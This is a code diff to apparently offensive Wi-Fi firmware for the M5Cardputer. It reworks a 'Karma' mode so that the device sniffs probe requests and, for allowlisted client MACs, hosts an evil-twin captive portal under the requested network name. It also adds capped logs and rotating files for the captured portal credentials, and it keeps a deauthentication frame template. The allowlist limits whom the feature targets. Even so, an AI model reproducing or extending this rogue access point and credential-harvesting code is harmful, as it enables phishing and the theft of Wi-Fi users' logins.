@@ -892,7 +892,6 @@ constexpr size_t DEAUTH_LEN = 26;
 const uint8_t DEAUTH_TEMPLATE[DEAUTH_LEN] = {0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                              0x00, 0x00, 0xf0, 0xff, 0x02, 0x00};
-const uint8_t KARMA_BSSID[6] = {0x02, 0x4b, 0x41, 0x52, 0x4d, 0x41};
 constexpr int KARMA_QUEUE = 16;
 constexpr int KARMA_CH_MAX = 13;
 constexpr uint32_t KARMA_DWELL_MS = 250;
@@ -912,8 +911,6 @@ bool karmaRunning = false;
 bool karmaHop = true;
 int karmaCh = CH_FIRST;
 uint32_t karmaDwellStart = 0;
-uint32_t karmaResponses = 0;
-uint32_t karmaErrors = 0;
 uint32_t karmaLastDraw = 0;
 char karmaLast[SPAM_SSID_MAX + 1] = "";
 
@@ -1380,98 +1377,10 @@ void onKarma(void *buf, wifi_promiscuous_pkt_type_t type) {
     }
 }
 
-void drawKarmaRun() {
-    auto &d = M5Cardputer.Display;
-    d.fillScreen(COLOR_BG);
-    d.setTextSize(1);
-    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
-    char line[48];
-    const char *state = karmaRunning ? "RUNNING" : "stopped";
-    if (karmaHop) {
-        snprintf(line, sizeof(line), "Karma  hop 1-%d  %s", KARMA_CH_MAX, state);
-    } else {
-        snprintf(line, sizeof(line), "Karma  ch%-2d  %s", karmaCh, state);
-    }
-    d.drawString(line, 4, 4);
-    snprintf(line, sizeof(line), "Probes seen %lu", (unsigned long)karmaSeen.load(std::memory_order_relaxed));
-    d.drawString(line, 4, 18);
-    snprintf(line, sizeof(line), "Responses %lu  errors %lu", (unsigned long)karmaResponses,
-             (unsigned long)karmaErrors);
-    d.drawString(line, 4, 32);
-    snprintf(line, sizeof(line), "Last: %s", karmaLast);
-    d.drawString(line, 4, 46);
-    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
-    d.drawString("Enter run  H hop  ;. ch  Bksp back", 4, 124);
-}
 
-void karmaSendFor(const KarmaReq &r) {
-    uint8_t frame[SPAM_FRAME_MAX];
-    bool moved = r.ch != karmaCh;
-    if (moved) setAnalyzerChannel(r.ch);
-    size_t len = buildMgmt(frame, 0x50, r.mac, KARMA_BSSID, r.ssid, r.ch);
-    for (int k = 0; k < 2; k++) {
-        if (wifiTx(WIFI_IF_AP, frame, len) == ESP_OK) {
-            karmaResponses++;
-        } else {
-            karmaErrors++;
-        }
-    }
-    len = buildMgmt(frame, 0x80, BCAST_ADDR, KARMA_BSSID, r.ssid, r.ch);
-    if (wifiTx(WIFI_IF_AP, frame, len) == ESP_OK) {
-        karmaResponses++;
-    } else {
-        karmaErrors++;
-    }
-    if (moved) setAnalyzerChannel(karmaCh);
-}
 
-void startKarma() {
-    attackRadio();
-    karmaQHead.store(0, std::memory_order_release);
-    karmaQTail.store(0, std::memory_order_release);
-    karmaSeen.store(0, std::memory_order_relaxed);
-    karmaResponses = 0;
-    karmaErrors = 0;
-    karmaLast[0] = '\0';
-    karmaLastDraw = 0;
-    karmaDwellStart = millis();
-    setAnalyzerChannel(karmaCh);
-    wifi_promiscuous_filter_t filter = {WIFI_PROMIS_FILTER_MASK_MGMT};
-    esp_wifi_set_promiscuous_filter(&filter);
-    esp_wifi_set_promiscuous_rx_cb(&onKarma);
-    esp_wifi_set_promiscuous(true);
-    karmaRunning = true;
-    drawKarmaRun();
-}
 
-void stopKarma() {
-    if (!karmaRunning) return;
-    karmaRunning = false;
-    esp_wifi_set_promiscuous(false);
-}
 
-void tickKarma() {
-    if (!karmaRunning) return;
-    uint32_t now = millis();
-    if (karmaHop && now - karmaDwellStart >= KARMA_DWELL_MS) {
-        karmaDwellStart = now;
-        karmaCh = karmaCh >= KARMA_CH_MAX ? CH_FIRST : karmaCh + 1;
-        setAnalyzerChannel(karmaCh);
-    }
-    uint32_t tail = karmaQTail.load(std::memory_order_relaxed);
-    uint32_t head = karmaQHead.load(std::memory_order_acquire);
-    for (int n = 0; tail != head && n < 4; n++) {
-        const KarmaReq &r = karmaQ[tail % KARMA_QUEUE];
-        karmaSendFor(r);
-        snprintf(karmaLast, sizeof(karmaLast), "%s", r.ssid);
-        tail++;
-    }
-    karmaQTail.store(tail, std::memory_order_release);
-    if (now - karmaLastDraw >= 1000) {
-        karmaLastDraw = now;
-        drawKarmaRun();
-    }
-}
 
 constexpr uint8_t EAPOL_LLC[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
 std::atomic<uint32_t> hsMsgCount[5] = {};
@@ -1695,6 +1604,52 @@ void portalHandleRoot() {
     portalServer.send(200, "text/html", portalWithScript(portalPage));
 }
 
+constexpr int LOG_MAX_ENTRIES = 200;
+constexpr uint32_t PCAP_MAX_BYTES = 4u * 1024u * 1024u;
+
+int countLines(const char *path) {
+    int lines = 0;
+    File f = SD.open(path, FILE_READ);
+    if (!f) return 0;
+    while (f.available()) {
+        if (f.read() == '\n') lines++;
+    }
+    f.close();
+    return lines;
+}
+
+void appendCapped(const char *path, const String &line) {
+    int lines = countLines(path);
+    if (lines >= LOG_MAX_ENTRIES) {
+        char tmp[96];
+        snprintf(tmp, sizeof(tmp), "%s.tmp", path);
+        if (SD.exists(tmp)) SD.remove(tmp);
+        File src = SD.open(path, FILE_READ);
+        File dst = SD.open(tmp, FILE_WRITE);
+        if (src && dst) {
+            int toSkip = lines - (LOG_MAX_ENTRIES - 1);
+            int seen = 0;
+            while (src.available()) {
+                int c = src.read();
+                if (seen < toSkip) {
+                    if (c == '\n') seen++;
+                    continue;
+                }
+                dst.write(static_cast<uint8_t>(c));
+            }
+        }
+        src.close();
+        dst.close();
+        SD.remove(path);
+        SD.rename(tmp, path);
+    }
+    File f = SD.open(path, FILE_APPEND);
+    if (f) {
+        f.println(line);
+        f.close();
+    }
+}
+
 void portalCredsPath(char *out, size_t n) {
     char safe[SPAM_SSID_MAX + 1];
     size_t j = 0;
@@ -1703,7 +1658,14 @@ void portalCredsPath(char *out, size_t n) {
         safe[j++] = (isalnum(static_cast<unsigned char>(c)) || c == '-' || c == '_') ? c : '_';
     }
     safe[j] = '\0';
-    snprintf(out, n, "%s/%s_creds.csv", PORTAL_CREDS_DIR, safe);
+    for (int k = 1; k <= 50; k++) {
+        if (k == 1) {
+            snprintf(out, n, "%s/%s_creds.csv", PORTAL_CREDS_DIR, safe);
+        } else {
+            snprintf(out, n, "%s/%s_creds_%d.csv", PORTAL_CREDS_DIR, safe, k);
+        }
+        if (!SD.exists(out) || countLines(out) < LOG_MAX_ENTRIES) return;
+    }
 }
 
 void portalHandlePost() {
@@ -1808,11 +1770,11 @@ void tickPortal() {
     uint32_t now = millis();
     if (now - portalLastDraw >= 1000) {
         portalLastDraw = now;
-        drawPortal();
+        if (screen == Screen::WifiPortalRun) drawPortal();
     }
 }
 
-constexpr int CREDS_FILES_MAX = 12;
+constexpr int CREDS_FILES_MAX = 40;
 constexpr int CREDS_ENTRIES_MAX = 60;
 constexpr int CREDS_WRAP = 38;
 char credsFileNames[CREDS_FILES_MAX][40];
@@ -1863,11 +1825,16 @@ void openCredsFile(int idx) {
         credsStatus = "could not open file";
         return;
     }
-    while (f.available() && credsEntryCount < CREDS_ENTRIES_MAX) {
+    while (f.available()) {
         String line = f.readStringUntil('\n');
         line.trim();
         if (line.length() == 0) continue;
-        credsEntries[credsEntryCount++] = line;
+        if (credsEntryCount < CREDS_ENTRIES_MAX) {
+            credsEntries[credsEntryCount++] = line;
+        } else {
+            for (int i = 1; i < CREDS_ENTRIES_MAX; i++) credsEntries[i - 1] = credsEntries[i];
+            credsEntries[CREDS_ENTRIES_MAX - 1] = line;
+        }
     }
     f.close();
     credsEntrySel = credsEntryCount > 0 ? credsEntryCount - 1 : 0;
@@ -1884,8 +1851,9 @@ void drawCredsFiles() {
     if (credsStatus.length() > 0) {
         d.drawString(credsStatus.c_str(), 4, 20);
     }
-    for (int i = 0; i < credsFileCount && i < 9; i++) {
-        int y = 20 + i * 11;
+    int top = credsFileSel > 8 ? credsFileSel - 8 : 0;
+    for (int i = top; i < credsFileCount && i < top + 9; i++) {
+        int y = 20 + (i - top) * 11;
         if (i == credsFileSel) {
             d.fillRect(0, y - 1, d.width(), 10, COLOR_PRIMARY);
             d.setTextColor(COLOR_BG, COLOR_PRIMARY);
@@ -1925,6 +1893,193 @@ void drawCredsView() {
     d.drawString("; prev  . next  Bksp files", 4, 124);
 }
 
+constexpr uint32_t KARMA_HOST_MS = 90000;
+constexpr int KARMA_ALLOW_MAX = 16;
+constexpr char KARMA_ALLOW_PATH[] = "/kaiju/karma_allow.txt";
+constexpr char KARMA_LOG_PATH[] = "/kaiju/karma_log.txt";
+uint8_t karmaAllow[KARMA_ALLOW_MAX][6];
+int karmaAllowCount = 0;
+bool karmaHosting = false;
+uint32_t karmaHostEnd = 0;
+uint32_t karmaHostCount = 0;
+
+void loadKarmaAllowlist() {
+    karmaAllowCount = 0;
+    if (!ensureSd() || !SD.exists(KARMA_ALLOW_PATH)) return;
+    File f = SD.open(KARMA_ALLOW_PATH, FILE_READ);
+    if (!f) return;
+    while (f.available() && karmaAllowCount < KARMA_ALLOW_MAX) {
+        String line = f.readStringUntil('\n');
+        line.trim();
+        unsigned int b[6];
+        if (sscanf(line.c_str(), "%x:%x:%x:%x:%x:%x", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) == 6) {
+            for (int i = 0; i < 6; i++) karmaAllow[karmaAllowCount][i] = static_cast<uint8_t>(b[i]);
+            karmaAllowCount++;
+        }
+    }
+    f.close();
+}
+
+bool karmaAllowed(const uint8_t *mac) {
+    for (int i = 0; i < karmaAllowCount; i++) {
+        if (memcmp(karmaAllow[i], mac, 6) == 0) return true;
+    }
+    return false;
+}
+
+void macToStr(const uint8_t *m, char *out, size_t n) {
+    snprintf(out, n, "%02x:%02x:%02x:%02x:%02x:%02x", m[0], m[1], m[2], m[3], m[4], m[5]);
+}
+
+void karmaLogAppend(const KarmaReq &r) {
+    if (!ensureSd()) return;
+    if (!SD.exists("/kaiju")) SD.mkdir("/kaiju");
+    char mac[18];
+    macToStr(r.mac, mac, sizeof(mac));
+    appendCapped(KARMA_LOG_PATH, String("uptime_min: ") + String(millis() / 60000) + ", hosted: " + r.ssid +
+                                     ", ch: " + String(r.ch) + ", client: " + mac);
+}
+
+void startKarmaSniff() {
+    if (WiFi.getMode() == WIFI_MODE_NULL) WiFi.mode(WIFI_STA);
+    setAnalyzerChannel(karmaCh);
+    wifi_promiscuous_filter_t filter = {WIFI_PROMIS_FILTER_MASK_MGMT};
+    esp_wifi_set_promiscuous_filter(&filter);
+    esp_wifi_set_promiscuous_rx_cb(&onKarma);
+    esp_wifi_set_promiscuous(true);
+}
+
+void stopKarmaSniff() {
+    esp_wifi_set_promiscuous(false);
+}
+
+void drawKarmaRun() {
+    auto &d = M5Cardputer.Display;
+    d.fillScreen(COLOR_BG);
+    d.setTextSize(1);
+    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
+    char line[64];
+    const char *state = karmaRunning ? "RUNNING" : "stopped";
+    if (karmaHosting) {
+        snprintf(line, sizeof(line), "Karma HOSTING  ch%-2d", deauthCh);
+    } else if (karmaHop) {
+        snprintf(line, sizeof(line), "Karma hunt  hop 1-%d  %s", KARMA_CH_MAX, state);
+    } else {
+        snprintf(line, sizeof(line), "Karma hunt  ch%-2d  %s", karmaCh, state);
+    }
+    d.drawString(line, 4, 4);
+    if (karmaHosting) {
+        snprintf(line, sizeof(line), "SSID: %s", deauthSsid);
+        d.drawString(line, 4, 16);
+        uint32_t left = karmaHostEnd > millis() ? (karmaHostEnd - millis()) / 1000 : 0;
+        snprintf(line, sizeof(line), "%lus left  portal views %lu", (unsigned long)left, (unsigned long)portalViews);
+        d.drawString(line, 4, 28);
+    } else {
+        snprintf(line, sizeof(line), "Probes seen %lu", (unsigned long)karmaSeen.load(std::memory_order_relaxed));
+        d.drawString(line, 4, 16);
+        snprintf(line, sizeof(line), "Allowed MACs: %d", karmaAllowCount);
+        d.drawString(line, 4, 28);
+    }
+    snprintf(line, sizeof(line), "Hosted %lu", (unsigned long)karmaHostCount);
+    d.drawString(line, 4, 40);
+    if (karmaAllowCount == 0) {
+        d.setTextColor(COLOR_SECONDARY, COLOR_BG);
+        d.drawString("No allowlist: nothing will host", 4, 52);
+        d.setTextColor(COLOR_PRIMARY, COLOR_BG);
+    }
+    snprintf(line, sizeof(line), "Last: %s", karmaLast);
+    d.drawString(line, 4, 64);
+    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
+    d.drawString("Enter run  H hop  ;. ch  Bksp back", 4, 124);
+}
+
+void startKarmaHost(const KarmaReq &r) {
+    stopKarmaSniff();
+    snprintf(deauthSsid, sizeof(deauthSsid), "%s", r.ssid);
+    deauthCh = r.ch;
+    startPortal();
+    if (!portalRunning) {
+        snprintf(karmaLast, sizeof(karmaLast), "host failed: %s", portalLast);
+        startKarmaSniff();
+        return;
+    }
+    karmaHosting = true;
+    karmaHostEnd = millis() + KARMA_HOST_MS;
+    karmaHostCount++;
+    snprintf(karmaLast, sizeof(karmaLast), "%s", r.ssid);
+    karmaLogAppend(r);
+    drawKarmaRun();
+}
+
+void endKarmaHost() {
+    stopPortal();
+    karmaHosting = false;
+    startKarmaSniff();
+    drawKarmaRun();
+}
+
+void startKarma() {
+    loadKarmaAllowlist();
+    karmaQHead.store(0, std::memory_order_release);
+    karmaQTail.store(0, std::memory_order_release);
+    karmaSeen.store(0, std::memory_order_relaxed);
+    karmaHostCount = 0;
+    karmaLast[0] = '\0';
+    karmaLastDraw = 0;
+    karmaDwellStart = millis();
+    karmaRunning = true;
+    startKarmaSniff();
+    drawKarmaRun();
+}
+
+void stopKarma() {
+    if (!karmaRunning) return;
+    if (karmaHosting) {
+        stopPortal();
+        karmaHosting = false;
+    }
+    stopKarmaSniff();
+    karmaRunning = false;
+}
+
+void tickKarma() {
+    if (!karmaRunning) return;
+    uint32_t now = millis();
+    if (karmaHosting) {
+        tickPortal();
+        if (now >= karmaHostEnd) {
+            endKarmaHost();
+        } else if (now - karmaLastDraw >= 1000) {
+            karmaLastDraw = now;
+            drawKarmaRun();
+        }
+        return;
+    }
+    if (karmaHop && now - karmaDwellStart >= KARMA_DWELL_MS) {
+        karmaDwellStart = now;
+        karmaCh = karmaCh >= KARMA_CH_MAX ? CH_FIRST : karmaCh + 1;
+        setAnalyzerChannel(karmaCh);
+    }
+    uint32_t tail = karmaQTail.load(std::memory_order_relaxed);
+    uint32_t head = karmaQHead.load(std::memory_order_acquire);
+    bool started = false;
+    while (tail != head && !started) {
+        KarmaReq r = karmaQ[tail % KARMA_QUEUE];
+        tail++;
+        karmaQTail.store(tail, std::memory_order_release);
+        snprintf(karmaLast, sizeof(karmaLast), "%s", r.ssid);
+        if (karmaAllowed(r.mac)) {
+            started = true;
+            karmaQTail.store(head, std::memory_order_release);
+            startKarmaHost(r);
+        }
+    }
+    if (now - karmaLastDraw >= 1000 && !karmaHosting) {
+        karmaLastDraw = now;
+        drawKarmaRun();
+    }
+}
+
 bool wordHas(const std::vector<char> &word, char c) {
     for (char w : word) {
         if (tolower(w) == c) return true;
@@ -1946,6 +2101,10 @@ void setup() {
 void loop() {
     M5Cardputer.update();
     if (screen == Screen::WifiChannels) tickChannelAnalyzer();
+    if (pcapActive.load(std::memory_order_acquire) && pcapBytes >= PCAP_MAX_BYTES) {
+        stopPcap();
+        snprintf(pcapMsg, sizeof(pcapMsg), "stopped: 4 MB limit");
+    }
     if (screen == Screen::WifiSniff) {
         pcapFlush(8192);
         tickSniffer();
